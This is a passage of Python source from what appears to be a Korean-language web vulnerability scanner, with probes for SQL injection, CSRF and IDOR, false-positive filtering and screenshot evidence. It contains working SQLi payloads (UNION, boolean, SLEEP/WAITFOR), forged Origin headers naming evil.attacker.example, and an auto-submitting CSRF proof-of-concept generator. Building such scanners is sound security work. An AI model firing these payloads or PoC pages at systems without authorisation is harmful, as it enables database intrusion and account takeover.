                    req_hdrs = {**_SCANNER_HEADERS}
                    if pt["method"] == "POST":
                        req_body_str = "&".join(f"{k}={v}" for k, v in tp.items())
                    else:
                        req_body_str = ""
                    burp_shot = await _playwright_capture_burp_style(
                        scan_id=scan_id,
                        label=f"sqli_err_{param[:8]}",
                        method=pt["method"],
                        req_url=shot_url,
                        req_headers=req_hdrs,
                        req_body=req_body_str,
                        resp_status=status,
                        resp_headers={},
                        resp_body=body[:3000],
                        title=f"SQL 인젝션 — DB 에러 노출 ({param}={payload})",
                    )
                    if burp_shot:
                        shots.append(burp_shot)
                    return {
                        "type": "error_based",
                        "param": param,
                        "payload": payload,
                        "url": pt["url"],
                        "method": pt["method"],
                        # 정확 재현용: GET 은 주입된 완전 URL, POST 는 base URL + 주입 body
                        "repro_url": shot_url,
                        "repro_body": ("&".join(
                            f"{k}={urllib.parse.quote(str(v), safe='')}" for k, v in tp.items())
                            if pt["method"] == "POST" else ""),
                        "error_snippet": snippet,
                        "confirmed": True,
                        "evidence_screenshots": shots,
                        "evidence": (f"DB 에러 메시지 직접 노출(SQLi 에러기반 확증 + DBMS 정보노출·CWE-209): "
                                     f"{snippet}"),
                    }
    return None


async def _probe_sqli_union(session, points: list[dict], scan_id: str = "") -> dict | None:
    """UNION SELECT 기반 SQL 인젝션: DB 버전 정보 추출 확인 + 스크린샷."""
    for pt in points[:_sqli_cap(8)]:
        for param in list(pt["params"])[:6]:
            # 베이스라인 응답 먼저 수집 — 페이로드 없이도 버전 문자열이 있으면 오탐 방지
            if pt["method"] == "POST":
                _, baseline_body, _ = await _post(session, pt["url"], data=pt["params"])
            else:
                _, baseline_body, _ = await _get(
                    session, pt["url"] + "?" + urllib.parse.urlencode(pt["params"])
                )

            for payload in _SQLI_UNION_PAYLOADS[:5]:
                tp = {**pt["params"], param: payload}
                if pt["method"] == "POST":
                    status, body, _ = await _post(session, pt["url"], data=tp)
                    shot_url = pt["url"]
                else:
                    shot_url = pt["url"] + "?" + urllib.parse.urlencode(tp)
                    status, body, _ = await _get(session, shot_url)

                # 200 응답만 유효 — 302/301은 WAF 차단 리다이렉트
                if status != 200 or not body:
                    continue
                # WAF 차단 페이지 명시 제외
                if _WAF_BLOCK_RE.search(body):
                    continue

                m = _SQLI_VERSION_RE.search(body)
                if not m:
                    continue

                ver = m.group(1)
                # 베이스라인에도 동일 버전 문자열이 있으면 원래부터 있던 텍스트 → 오탐
                if baseline_body and ver in baseline_body:
                    continue
                # 짧은 버전(x.y 두 자리)에 DB 키워드가 없으면 오탐 — "1.0", "2.0" 류 제거
                db_kw = re.search(r"(MariaDB|MySQL|PostgreSQL|SQLite|MSSQL)", ver, re.IGNORECASE)
                if ver.count(".") < 2 and not db_kw:
                    continue
                # 메이저 버전이 너무 낮으면 HTML/HTTP 버전 오탐 가능성 높음
                try:
                    major = float(ver.split(".")[0])
                    if major < 3 and not db_kw:
                        continue
                except Exception:
                    pass

                base_url = pt["url"]
                shots = await _capture_step_shots(scan_id, [
                    (base_url,
                     f"【1단계】 점검 대상 URL 접속\nURL: {base_url[:100]}\n"
                     f"취약 파라미터 '{param}' 식별",
                     "#1E3A5F", "left"),
                    (shot_url,
                     f"【2단계】 UNION SELECT 페이로드 삽입 ({pt['method']})\n"
                     f"파라미터: {param}\n페이로드: {payload[:80]}",
                     "#B45309", "left"),
                    (shot_url,
                     f"【3단계】 ★ SQL 인젝션 취약점 확인됨\n"
                     f"UNION SELECT로 DB 버전 정보 추출 성공:\n{ver}",
                     "#DC2626", "center"),
                ], f"sqli_union_{param[:8]}")
                # DevTools Network 탭 — UNION SELECT 버전 추출 응답 증거
                dt_shot = await _capture_devtools_network_shot(
                    scan_id=scan_id,
                    label=f"sqli_union_{param[:8]}",
                    target_url=shot_url,
                    highlight_texts=[ver],
                    vuln_title=f"SQL 인젝션 UNION SELECT — DB 버전 {ver} 추출 성공",
                )
                if dt_shot:
                    shots.append(dt_shot)
                return {
                    "type": "union_based",
                    "param": param,
                    "payload": payload,
                    "url": pt["url"],
                    "method": pt["method"],
                    "extracted_version": ver,
                    "confirmed": True,
                    "evidence_screenshots": shots,
                    "evidence": f"UNION SELECT로 DB 버전 추출 성공: {ver}",
                }
    return None


async def _probe_sqli_bool(session, points: list[dict]) -> dict | None:
    """불린 기반 블라인드 SQL 인젝션: 참/거짓 조건 응답 차이 확인."""
    # 페이로드 쌍 순서 = 블라인드 판별력 순.
    # ★AND 기반이 핵심: 참(기존 레코드 '존재')↔거짓('부재')로 응답이 갈린다. OR 기반은 기존 id(=1)가
    #   항상 매칭돼 참·거짓 모두 '존재'로 나와 블라인드(예: DVWA /sqli_blind/ 의 exists/MISSING)를
    #   구분하지 못했다 — 그래서 AND 쌍(따옴표/숫자/이중따옴표/주석 컨텍스트)을 앞에 둔다.
    bool_payload_pairs = [
        ("1' AND '1'='1",  "1' AND '1'='2"),         # 블라인드: 따옴표 컨텍스트(Low)
        ("1 AND 1=1",      "1 AND 1=2"),             # 블라인드: 숫자형(따옴표 없음, Medium)
        ('1" AND "1"="1',  '1" AND "1"="2'),          # 블라인드: 이중따옴표 컨텍스트
        ("1' AND 1=1-- -", "1' AND 1=2-- -"),         # 블라인드: 따옴표+주석
        ("1' OR '1'='1",   "1' OR '1'='2"),          # 대량차이형(전체 vs 단건) — 기본
        ("1'\tOR\t'1'='1", "1'\tOR\t'1'='2"),         # 공백필터 우회(탭)
        ("1'||'1'='1",     "1'||'1'='2"),            # || 연산자
        ("1 OR 1=1",       "1 OR 1=2"),              # 숫자형 OR
    ]

    for pt in points[:_sqli_cap(8)]:
        for param in list(pt["params"])[:6]:
            base_params = dict(pt["params"])
            for true_payload, false_payload in bool_payload_pairs:
                true_p  = {**base_params, param: true_payload}
                false_p = {**base_params, param: false_payload}

                if pt["method"] == "POST":
                    st_t, body_t, _ = await _post(session, pt["url"], data=true_p)
                    st_f, body_f, _ = await _post(session, pt["url"], data=false_p)
                else:
                    st_t, body_t, _ = await _get(session, pt["url"] + "?" + urllib.parse.urlencode(true_p))
                    st_f, body_f, _ = await _get(session, pt["url"] + "?" + urllib.parse.urlencode(false_p))

                # 302/301 = WAF 리다이렉트 → 취약점 아님
                if st_t != 200 or st_f != 200:
                    continue
                if _WAF_BLOCK_RE.search(body_t or "") or _WAF_BLOCK_RE.search(body_f or ""):
                    continue

                if body_t and body_f:
                    import difflib as _dl
                    def _sim(a, b):
                        # 내용 유사도(0~1). 공백 정규화 + 상한 절단으로 비용 제한.
                        _a = " ".join((a or "")[:6000].split())
                        _b = " ".join((b or "")[:6000].split())
                        return _dl.SequenceMatcher(None, _a, _b).quick_ratio()
                    diff = abs(len(body_t) - len(body_f))
                    _norm = lambda x: " ".join((x or "")[:8000].split())
                    # 길이 차이가 크거나(기존), 길이는 비슷해도 '내용'이 뚜렷이 다르면(신규: 같은 길이의
                    # 레코드1건 vs '결과없음' 등) 후보로 진입. 아래 안정성·대조군으로 오탐을 걸러낸다.
                    _len_sig = diff > 80 and diff / max(len(body_t), 1) > 0.05
                    _content_sig = _sim(body_t, body_f) < 0.95
                    # '작지만 일관된' 차이(예: exists↔MISSING 한 단어)도 블라인드 신호 — 유사도/길이로는
                    # 안 걸리므로 정규화 후 '실제로 다름'을 추가 진입조건으로. (오탐은 아래 대조군이 차단)
                    _exact_sig = _norm(body_t) != _norm(body_f)
                    if _len_sig or _content_sig or _exact_sig:
                        # 동적 콘텐츠 오탐 배제 — 안정성(재요청 일치) + 대조군(benign≈false) 검증.
                        async def _bfetch(val):
                            p = {**base_params, param: val}
                            if pt["method"] == "POST":
                                _, b, _ = await _post(session, pt["url"], data=p)
                            else:
                                _, b, _ = await _get(session, pt["url"] + "?" + urllib.parse.urlencode(p))
                            return b or ""

                        # 판별을 '차이 규모'에 따라 2단계로 나눈다(오탐 0 원칙):
                        #  · 큰 차이(_len_sig/_content_sig): 유사도 기반(부수 잡음에 관대) — 전체노출 vs 단건 등.
                        #  · 작은 차이(_exact_sig 만): 유사도 크기로는 '한 단어 불린신호(exists/MISSING)'와
                        #    '타임스탬프·토큰 같은 부수 잡음'을 못 가른다 → '완전 안정성'으로 판별한다.
                        #    참 응답이 반복 시 정규화-동일 + 거짓도 동일 + 참≠거짓 이어야 확증. 응답에 동적
                        #    콘텐츠가 조금이라도 있으면 참 응답이 흔들려(정규화 불일치) 자동 배제된다(오탐 차단).
                        _big = bool(_len_sig or _content_sig)
                        if _big:
                            def _stable(a, b): return _sim(a, b) >= 0.97
                            def _diff(a, b):   return _sim(a, b) < 0.92
                        else:
                            def _stable(a, b): return _norm(a) == _norm(b)
                            def _diff(a, b):   return _norm(a) != _norm(b)

                        # P4: 통계적 차등 루프 — 예산 연동 N회(2~6) 반복해 true≠false 구분이
                        # '일관되게' 성립할 때만 확증한다(동적 콘텐츠·간헐 변동으로 인한 오탐 제거).
                        try:
                            import scan_depth as _sd_b
                            _samples = _sd_b.blind_samples()
                        except Exception:
                            _samples = 2
                        _t_ref, _f_ref = body_t, body_f
                        _consistent = True
                        for _i in range(_samples):
                            _bt = await _bfetch(true_payload)
                            _bf = await _bfetch(false_payload)
                            # 매 시행: true 는 이전 true 와 안정 + false 도 안정 + true↔false 는 구분
                            if not (_stable(_bt, _t_ref) and _stable(_bf, _f_ref) and _diff(_bt, _bf)):
                                _consistent = False
                                break
                            _t_ref, _f_ref = _bt, _bf
                        # 대조군: 존재하지 않을 무해 값 → 거짓 조건(무결과)과 유사해야 함.
                        # 숫자형 큰 값을 쓴다 — 문자열 대조군은 따옴표 없는 숫자 컨텍스트(예: DVWA
                        # Medium 블라인드)에서 SQL 오류를 유발해 거짓과 달라져(→미탐) 버렸다. 큰 숫자는
                        # 따옴표/숫자 두 컨텍스트 모두에서 '무결과(거짓)'로 안전하게 수렴한다.
                        body_ctrl = await _bfetch("9999999")
                        control_ok = _stable(body_ctrl, body_f)
                        if not (_consistent and control_ok):
                            continue    # N회 중 한 번이라도 흔들리거나 대조군 불일치 → 동적 콘텐츠, 오탐
                        return {
                            "type": "boolean_based",
                            "param": param,
                            "true_payload": true_payload,
                            "false_payload": false_payload,
                            "url": pt["url"],
                            "method": pt["method"],
                            "response_diff_bytes": diff,
                            "confirmed": True,
                            "evidence": (
                                f"불린 조건에 따른 응답 크기 차이 {diff}바이트(재요청 안정·대조군 일치) — "
                                f"SQL 조건절이 서버에서 해석됨"
                            ),
                        }
    return None


async def _probe_sqli_time(session, points: list[dict]) -> dict | None:
    """시간 기반 블라인드 SQL 인젝션: SLEEP/WAITFOR 지연 확인."""
    payloads = [
        ("MySQL",      "' AND SLEEP(4)-- -"),
        ("MySQL",      "1' AND SLEEP(4)-- -"),
        ("MSSQL",      "'; WAITFOR DELAY '0:0:4'-- -"),
        ("PostgreSQL", "' AND pg_sleep(4)-- -"),
    ]
    for pt in points[:_sqli_cap(4)]:
        for param in list(pt["params"])[:4]:
            # 베이스라인 응답 시간 측정 (슬로우 서버 오탐 방지)
            t_base0 = time.monotonic()
            if pt["method"] == "POST":
                await _post(session, pt["url"], data=pt["params"], timeout=10)
            else:
                await _get(session, pt["url"] + "?" + urllib.parse.urlencode(pt["params"]), timeout=10)
            baseline_elapsed = time.monotonic() - t_base0

            for db, payload in payloads[:2]:
                tp = {**pt["params"], param: payload}
                t0 = time.monotonic()
                if pt["method"] == "POST":
                    await _post(session, pt["url"], data=tp, timeout=12)
                else:
                    await _get(session, pt["url"] + "?" + urllib.parse.urlencode(tp), timeout=12)
                elapsed = time.monotonic() - t0

                # 실제 지연이 베이스라인보다 3초 이상 길어야 인정
                induced_delay = elapsed - baseline_elapsed
                if elapsed >= 3.5 and induced_delay >= 3.0:
                    # 검증: 지연이 주입한 SLEEP 값에 '비례'하는지 확인 — 상수 슬로우/네트워크 지터 오탐 배제.
                    # SLEEP(1) 로 재요청 → ~1초여야(4초 지연보다 확실히 작고 2.5초 미만).
                    vpayload = (payload.replace("SLEEP(4)", "SLEEP(1)")
                                       .replace("pg_sleep(4)", "pg_sleep(1)")
                                       .replace("0:0:4", "0:0:1"))
                    vp = {**pt["params"], param: vpayload}
                    tv0 = time.monotonic()
                    if pt["method"] == "POST":
                        await _post(session, pt["url"], data=vp, timeout=10)
                    else:
                        await _get(session, pt["url"] + "?" + urllib.parse.urlencode(vp), timeout=10)
                    v_delay = (time.monotonic() - tv0) - baseline_elapsed
                    if not (v_delay < induced_delay - 1.5 and v_delay < 2.5):
                        continue    # 지연이 SLEEP 값에 비례하지 않음 → 상수 슬로우, 오탐
                    return {
                        "type": "time_based",
                        "param": param,
                        "payload": payload,
                        "db_type": db,
                        "url": pt["url"],
                        "method": pt["method"],
                        "elapsed_sec": round(elapsed, 1),
                        "baseline_sec": round(baseline_elapsed, 1),
                        "induced_delay_sec": round(induced_delay, 1),
                        "confirmed": True,
                        "evidence": (
                            f"시간 기반 SQL 인젝션: {db} SLEEP 페이로드 → "
                            f"{elapsed:.1f}초 (베이스라인 {baseline_elapsed:.1f}초 대비 "
                            f"+{induced_delay:.1f}초 지연 확인)"
                        ),
                    }
    return None


# ── CF: CSRF (크로스사이트 요청 위조) ────────────────────────────────────────────

_CSRF_SAFE_PATHS = re.compile(
    r'(logout|signout|delete|remove|cancel|deactivate|change.?password|update)',
    re.IGNORECASE,
)

_CSRF_TOKEN_RE = re.compile(
    r'name\s*=\s*[\'"]?(user_token|csrf[_-]?token|csrftoken|authenticity_token|_token|'
    r'csrfmiddlewaretoken|__RequestVerificationToken|xsrf[_-]?token|anti[_-]?csrf)', re.IGNORECASE)
_CSRF_STATECHANGE_RE = re.compile(
    r'name\s*=\s*[\'"]?(password_new|password_conf|new_password|newpass|change|update|'
    r'delete|remove|deactivate|transfer|amount|role|grant|email_new|account)', re.IGNORECASE)


async def _probe_csrf_structural(session, base_url: str, discovered_urls: list | None = None,
                                 scan_id: str = "", points: list | None = None) -> dict | None:
    """상태변경 폼의 CSRF 방어 부재를 '구조적'으로 확증한다(비파괴 — 폼을 절대 제출하지 않음).
    판정: 상태변경(비번변경·계정수정·삭제 등) 폼에 anti-CSRF 토큰이 없고, GET 방식이거나 세션
    쿠키에 SameSite 가 없으면 → 피해자가 공격 페이지 방문만으로 위조 가능(CSRF). 읽기(GET)만 수행.

    URL 소스는 discovered_urls 뿐 아니라 '폼 포인트(points)'도 포함한다 — 활성 프로브 실행 시점엔
    인증영역 URL 이 아직 discovered_urls 에 안 실렸을 수 있어(반복 재크롤은 이후), points 를 함께 봐야
    csrf/ 같은 인증영역 상태변경 폼을 놓치지 않는다(csrf_candidate 는 points 라 잡히던 불일치 해소)."""
    _cands = list(discovered_urls or [])
    _cands += [pt.get("url", "") for pt in (points or []) if isinstance(pt, dict)]
    _cands += get_auth_urls(scan_id)   # 인증 크롤 전체 페이지(라운드 교체로 누락된 인증영역 폼 보정)
    _urls = [base_url]
    for u in _cands:
        _u = u if isinstance(u, str) else u.get("url", "")
        if _u and re.search(r'(csrf|password|passwd|account|profile|/user|change|update|delete|setting|email)',
                            _u, re.IGNORECASE):
            _urls.append(_u)
    _urls = list(dict.fromkeys([u for u in _urls if u]))[:16]
    for url in _urls:
        try:
            _st, body, hdrs = await _get(session, url)
        except Exception:
            continue
        if not body or _st != 200:
            continue
        _samesite = "samesite" in str((hdrs or {}).get("Set-Cookie", "")).lower()
        for fm in re.findall(r'<form\b[^>]*>.*?</form>', body, re.IGNORECASE | re.DOTALL):
            if not _CSRF_STATECHANGE_RE.search(fm):
                continue                       # 상태변경 폼만(검색/로그인 등 제외)
            if _CSRF_TOKEN_RE.search(fm):
                continue                       # anti-CSRF 토큰 있음 → 보호됨
            _mm = re.search(r'method\s*=\s*[\'"]?(\w+)', fm, re.IGNORECASE)
            method = (_mm.group(1).upper() if _mm else "GET")
            if method != "GET" and _samesite:
                continue                       # POST + SameSite → 보호됨
            fields = [f for f in re.findall(r'name\s*=\s*[\'"]?([\w\[\]\-]+)', fm)][:8]
            _reason = ("상태변경을 GET 방식으로 처리(링크/이미지 태그만으로 위조 발동)" if method == "GET"
                       else "세션 쿠키에 SameSite 속성 미설정")

            # ── 실제 수행 실증(비파괴) — 비밀번호 변경 폼 한정 ──
            # '현재와 동일한 비밀번호'를 anti-CSRF 토큰 없이 + 외부 Origin/Referer 로 위조 전송해
            # 서버가 수락하면 CSRF 가 '실제로 실행됨'을 증명한다(값이 그대로라 실제 변경 없음 → 원상복구 불필요).
            _csrf_executed = False
            _exec_note = ""
            _exec_shots: list[str] = []
            _pw = get_auth_password(scan_id) if scan_id else ""
            _pw_fields = [f for f in fields if "pass" in f.lower()]
            if _pw and _pw_fields:
                _data = {}
                for f in fields:
                    if "pass" in f.lower():
                        _data[f] = _pw                                   # 현재와 동일 값(무변경)
                    elif f.lower() in ("change", "update", "submit", "save", "btnsign", "go"):
                        _data[f] = f                                     # 제출 버튼 값
                    # user_token/csrf 토큰류는 '의도적으로 제외'(토큰 없이 전송 = CSRF)
                _forge_hdr = {"Origin": "https://evil.attacker.example",
                              "Referer": "https://evil.attacker.example/csrf-poc.html"}
                try:
                    if method == "GET":
                        _fu = url + "?" + urllib.parse.urlencode(_data)
                        _est, _eb, _ = await _get(session, _fu, headers=_forge_hdr)
                    else:
                        _fu = url
                        _est, _eb, _ = await _post(session, url, data=_data, headers=_forge_hdr)
                    _eb = _eb or ""
                    # 성공(수락) 신호: 상태변경 성공 문구. 실패/방어 신호는 '토큰 검증 실패·차단' 같은
                    # 구체 문구만(페이지 제목의 'CSRF'·폼의 'token' 단어에 오반응하지 않도록 좁힘).
                    _success = re.search(r'(password\s*changed|changed\s*success|successfully\s*changed|'
                                         r'변경\s*(?:되었|완료|성공)|성공적으로\s*변경|updated\s*success)', _eb, re.IGNORECASE)
                    _defended = re.search(r'(invalid[^<]{0,20}token|token[^<]{0,20}(missing|invalid|mismatch|not)|'
                                          r'csrf\s*token\s*(?:is\s*)?(?:missing|invalid|required)|forbidden|\b403\b|'
                                          r'access\s*denied|요청[^<]{0,6}차단|토큰[^<]{0,10}(불일치|없|실패))', _eb, re.IGNORECASE)
                    _accepted = _est in (200, 302) and bool(_success) and not _defended
                    if _accepted:
                        _csrf_executed = True
                        _exec_note = (" [실제 수행 실증] anti-CSRF 토큰 없이 외부 Origin/Referer 로 위조한 "
                                      "상태변경 요청을 서버가 수락함(응답에 변경/성공 표시) = CSRF 실제 실행 확증. "
                                      "※ 비파괴: 비밀번호를 '현재와 동일한 값'으로 설정해 실제 값 변경 없음.")
                        if scan_id:
                            try:
                                _s2url = _fu if method == "GET" else url
                                _exec_shots = await _capture_step_shots(scan_id, [
                                    (url, f"【1단계】 상태변경 폼 — anti-CSRF 토큰 부재\nURL: {url}", "#1E3A5F", "left"),
                                    (_s2url,
                                     "【2단계】 ★ 토큰 없이 + 외부 Referer 로 '위조 요청' → 서버가 수락(변경 성공)\n"
                                     "= CSRF 실제 수행 확증 (비파괴: 현재와 동일 값으로 설정해 실제 변경 없음)",
                                     "#DC2626", "bottom"),
                                ], f"csrf_exec_{re.sub(chr(92)+'W','_',url)[-16:]}")
                            except Exception:
                                _exec_shots = []
                except Exception:
                    pass

            _base_ev = (f"상태변경 폼에 anti-CSRF 토큰이 없고, {_reason}. 피해자가 공격자 페이지를 "
                        f"열기만 해도 본인 의도와 무관하게 상태변경(예: 비밀번호 변경)이 실행될 수 있음.")
            return {
                "type": "csrf_no_token", "url": url, "method": method, "confirmed": True,
                "params": fields,
                "csrf_executed": _csrf_executed,
                "evidence_screenshots": _exec_shots,
                "evidence": (_base_ev + _exec_note if _csrf_executed
                             else _base_ev + " ※ 비파괴 원칙상 실제 값 변경은 수행하지 않고 폼 구조로 확증함."),
                "poc_html": _generate_csrf_poc(url, {f: "changed" for f in fields if f not in
                                                     ("Change", "Update", "Submit", "user_token")}),
            }
    return None


async def _probe_csrf(session, base_url: str, points: list[dict]) -> dict | None:
    """
    CSRF 취약점: POST 폼에 CSRF 토큰이 없거나,
    CSRF 토큰을 제거하고 요청을 보내도 수락되는지 확인합니다.
    """
    post_forms = [p for p in points if p["method"] == "POST" and p["source"] in _FORM_SOURCES]

    if not post_forms:
        return None

    for pt in post_forms[:5]:
        csrf_fields = pt.get("csrf_fields", [])

        # CSRF 토큰 없는 폼 → 교차출처 위조 가능 신호가 있을 때만 취약(오탐 방지).
        if not csrf_fields:
            # 검색성 폼(q/search/keyword 만 있는 비-상태변경)은 CSRF 의미 없음 → 제외
            _pk = {k.lower() for k in (pt.get("params") or {})}
            if _pk and _pk <= {"q", "query", "search", "keyword", "kw", "s", "wd"}:
                continue
            test_params = {**pt["params"]}
            status, body, _ = await _post(session, pt["url"], data=test_params)
            if status not in (200, 201, 302):
                continue
            # 핵심: 스푸핑된 Origin/Referer 로도 동일하게 수락되면 서버가 Origin 미검증 → 실제 위조 가능.
            # 스푸핑 Origin 이 거부(4xx)되면 Origin/Referer 로 CSRF 방어 중 → 오탐 배제.
            st_spoof, _b2, _h2 = await _post(
                session, pt["url"], data=test_params,
                headers={"Origin": "https://evil.example", "Referer": "https://evil.example/"})
            if st_spoof in (401, 403) or (st_spoof and st_spoof >= 400):
                continue                       # Origin 검증으로 거부 → 보호됨
            if st_spoof not in (200, 201, 302):
                continue                       # 판단 보류
            return {
                "type": "no_csrf_token",
                "url": pt["url"],
                "method": "POST",
                "params": list(test_params.keys()),
                "response_status": status,
                "confirmed": True,
                "evidence": (
                    f"POST {pt['url']}: CSRF 토큰이 없고, 스푸핑된 Origin(evil.example)으로 보낸 요청도 "
                    f"HTTP {st_spoof} 로 수락됨 — 서버가 CSRF 토큰·Origin/Referer 를 모두 미검증(교차출처 위조 가능)."
                ),
                "poc_html": _generate_csrf_poc(pt["url"], test_params),
            }

        # CSRF 토큰 있는 경우: 토큰 제거 후 재요청
        else:
            test_params = {k: v for k, v in pt["params"].items() if k not in csrf_fields}
            if not test_params:
                continue

            # 기준 응답 (토큰 포함)
            _, body_with, _ = await _post(session, pt["url"], data=pt["params"])
            # 토큰 없는 응답
            status_without, body_without, _ = await _post(session, pt["url"], data=test_params)

            # 응답이 동일하거나 200이면 CSRF 토큰 검증 미흡 — 단, 토큰 오류 페이지(재렌더)면 제외
            _token_err = re.search(r'(csrf|xsrf|token|invalid|만료|유효하지|검증\s*실패|forbidden|위조)',
                                   (body_without or "")[:3000], re.IGNORECASE)
            if status_without in (200, 201, 302) and not _token_err:
                len_diff = abs(len(body_with or "") - len(body_without or ""))
                if len_diff < 500:  # 응답 내용이 비슷하면 토큰 검증 안 함
                    return {
                        "type": "csrf_token_not_validated",
                        "url": pt["url"],
                        "method": "POST",
                        "csrf_fields_found": csrf_fields,
                        "response_status": status_without,
                        "confirmed": True,
                        "evidence": (
                            f"POST {pt['url']}: CSRF 토큰({', '.join(csrf_fields)}) 제거 후에도 "
                            f"HTTP {status_without} 응답 — 서버가 토큰을 실제로 검증하지 않음"
                        ),
                        "poc_html": _generate_csrf_poc(pt["url"], test_params),
                    }
    return None


def _generate_csrf_poc(url: str, params: dict) -> str:
    """CSRF 공격 PoC HTML 생성."""
    inputs = "\n".join(
        f'    <input type="hidden" name="{k}" value="{v}">'
        for k, v in params.items()
    )
    return (
        f'<html><body>\n'
        f'  <form action="{url}" method="POST" id="csrf_form">\n'
        f'{inputs}\n'
        f'  </form>\n'
        f'  <script>document.getElementById("csrf_form").submit();</script>\n'
        f'</body></html>'
    )


# ── 접근제어 후보(IDOR / CSRF) — 비파괴·자동공격 없음, '수동 검토' 후보로만 분류 ─────
# 객체 참조 추정 파라미터 이름(IDOR 후보). 정규화(소문자·구분자 제거)해서 매칭한다.
_IDOR_PARAM_NAMES = {
    "id", "uid", "userid", "accountid", "seq", "no", "idx",
    "memberid", "orderid", "boardid",
}
_IDOR_NORM = {n.replace("_", "").replace("-", "") for n in _IDOR_PARAM_NAMES}


def _probe_idor_candidates(points: list[dict]) -> dict | None:
    """IDOR 후보 식별: id/uid/userId/accountId/seq/no/idx/memberId/orderId/boardId 등
    객체 참조 파라미터를 수집한다. 자동 공격(값 치환 접근)은 수행하지 않고 수동 검토 후보로만 보고."""
    cands: list[dict] = []
    seen: set = set()
    for pt in points:
        params = pt.get("params") or {}
        method = (pt.get("method") or "GET").upper()
        for k in params:
            base = str(k).lower().replace("_", "").replace("-", "")
            if base not in _IDOR_NORM:
                continue
            path = urllib.parse.urlparse(pt.get("url", "")).path
            key = (method, path, base)
            if key in seen:
                continue
            seen.add(key)
            val = str(params.get(k, ""))
            cands.append({
                "url": pt.get("url", ""), "method": method, "param": k,
                "sample_value": val[:40], "numeric": val.isdigit(),
            })
    if not cands:
        return None
    return {
        "type": "idor_candidate",
        "candidates": cands[:50],
        "count": len(cands),
        "confirmed": False,
        "evidence": (
            f"객체 참조 추정 파라미터 {len(cands)}건 발견 — 권한 검증이 미흡하면 다른 사용자의 "
            f"객체에 접근(IDOR)할 가능성이 있어 수동 검토가 필요합니다. (자동 공격 미수행)"
        ),
    }


_IDOR_DENY_RE = re.compile(
    r'(login|sign\s*in|log\s*in|로그인|unauthor|forbidden|access\s*denied|권한\s*없|접근\s*거부|'
    r'not\s*allowed|please\s*log|세션\s*만료|\b401\b|\b403\b)', re.IGNORECASE)
_IDOR_EMPTY_RE = re.compile(
    r'(not\s*found|no\s*such|no\s*record|존재하지\s*않|없습니다|찾을\s*수\s*없|\b404\b|no\s*results)',
    re.IGNORECASE)


async def _idor_unauth_accessible(url: str) -> bool:
    """무인증(쿠키 없는) 세션으로 url 이 '실제 접근 가능(200 + 로그인/거부 아님)'한지. 공개자원 판별용."""
    try:
        conn = _ssl_connector()
        async with aiohttp.ClientSession(connector=conn,
                                         cookie_jar=aiohttp.CookieJar(unsafe=True)) as s2:
            async with s2.get(url, headers=_SCANNER_HEADERS, allow_redirects=False,
                              timeout=aiohttp.ClientTimeout(total=8)) as r:
                if r.status in (301, 302, 303, 307, 308):
                    loc = r.headers.get("Location", "")
                    return not bool(_LOGIN_URL_HINT.search(loc))   # 로그인으로 튕기면 접근불가
                if r.status != 200:
                    return False
                b = await r.text(errors="ignore")
                return not bool(_IDOR_DENY_RE.search(b))
    except Exception:
        return False   # 확인 불가 → 보수적으로 '접근 불가' 취급(IDOR 확증을 막지 않음)


async def _probe_idor_active(session, points: list[dict], scan_id: str = "") -> dict | None:
    """IDOR 능동 검증(비파괴·읽기전용 GET) — '수동 검토'로 떠넘기지 않고 실제 확증하거나 미보고(양호).

    원리: 인증 세션으로 객체참조(id/uid/no 등)를 '다른 값'으로 치환 접근해
      (1) 다른 레코드가 실제로 열람되고(응답이 원본과 뚜렷이 다른 유효 콘텐츠),
      (2) 그 자원이 '무인증으론 접근 불가'(로그인/거부)면 → 로그인만 하면 소유권 검증 없이 임의 객체를
          읽을 수 있는 접근통제 결함(IDOR)으로 확증한다.
    인증 세션이 없으면 공개자원과 구분 불가 → 확증하지 않고 미보고(양호, 오탐 방지)."""
    _auth = get_auth_cookies(scan_id) if scan_id else []
    if not _auth:
        return None
    import difflib as _dl

    def _sim(a, b):
        return _dl.SequenceMatcher(None, " ".join((a or "")[:5000].split()),
                                   " ".join((b or "")[:5000].split())).quick_ratio()

    seen: set = set()
    for pt in points[:40]:
        if (pt.get("method") or "GET").upper() != "GET":
            continue   # 안전상 GET 만(상태변경 없음)
        params = pt.get("params") or {}
        for k in list(params)[:6]:
            base = str(k).lower().replace("_", "").replace("-", "")
            if base not in _IDOR_NORM:
                continue
            orig = str(params.get(k, ""))
            if not orig.isdigit():
                continue
            path = urllib.parse.urlparse(pt.get("url", "")).path
            key = (path, base)
            if key in seen:
                continue
            seen.add(key)
            n = int(orig)
            _others = [str(x) for x in (n - 1, n + 1, 1, 2) if x >= 1 and str(x) != orig]
            _bp = dict(params)
            try:
                _so, _bo, _ = await _get(session, pt["url"] + "?" + urllib.parse.urlencode({**_bp, k: orig}))
            except Exception:
                continue
            if _so != 200 or not _bo or _IDOR_DENY_RE.search(_bo):
                continue
            for oid in _others[:2]:
                _test_url = pt["url"] + "?" + urllib.parse.urlencode({**_bp, k: oid})
                try:
                    _st, _bt, _ = await _get(session, _test_url)
                except Exception:
                    continue
                if _st != 200 or not _bt:
                    continue
                if _IDOR_DENY_RE.search(_bt) or _IDOR_EMPTY_RE.search(_bt):
                    continue
                if _sim(_bt, _bo) >= 0.97:
                    continue   # 원본과 사실상 동일(객체 안 바뀜/정적) → IDOR 근거 아님
                # 공개자원 배제: 무인증으로도 열리면 접근통제 자체가 없는 것 → IDOR 아님(정보노출 별개).
                if await _idor_unauth_accessible(_test_url):
                    continue
                _shots = []
                if scan_id:
                    try:
                        _shots = await _capture_step_shots(scan_id, [
                            (pt["url"] + "?" + urllib.parse.urlencode({**_bp, k: orig}),
                             f"【1단계】 인증 사용자 본인 객체 접근 — {k}={orig}", "#1E3A5F", "left"),
                            (_test_url,
                             f"【2단계】 ★ {k}={oid} 로 치환 → 다른 객체가 열람됨(무인증 불가한 자원)\n"
                             f"= 소유권 검증 없는 접근통제 결함(IDOR)", "#DC2626", "bottom"),
                        ], f"idor_{re.sub(chr(92)+'W','_', path)[-12:]}_{k}")
                    except Exception:
                        _shots = []
                return {
                    "type": "idor", "confirmed": True, "url": pt["url"], "method": "GET",
                    "param": k, "orig_value": orig, "accessed_value": oid,
                    "payload": f"{k}={oid}  (본인 값 {orig} → 타 객체 {oid} 치환)",
                    "evidence_screenshots": _shots,
                    "affected_endpoints": [_test_url],
                    "evidence": (
                        f"주입 위치: 파라미터 '{k}' @ {pt['url']} (GET)\n"
                        f"1) 인증 세션으로 본인 객체({k}={orig})는 정상 열람.\n"
                        f"2) {k}={oid} 로 '치환' 접근 → 원본과 뚜렷이 다른 유효 콘텐츠(다른 객체)가 열람됨.\n"
